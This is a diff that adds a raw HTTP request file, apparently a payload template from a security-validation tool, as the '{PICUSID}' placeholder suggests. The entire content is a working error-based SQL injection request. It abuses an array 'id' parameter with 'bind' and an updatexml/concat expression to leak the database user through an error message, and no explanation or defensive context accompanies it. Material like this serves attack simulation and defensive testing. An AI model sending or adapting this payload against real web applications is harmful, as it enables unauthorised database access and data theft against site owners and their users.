@@ -1,0 +1,6 @@
+GET /page{PICUSID}/?id%5B0%5D=bind&id%5B1%5D=0%20and%20updatexml(1%2Cconcat(0x7e%2Cuser()%2C0x7e)%2C1)&password=1 HTTP/1.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: text/html
+
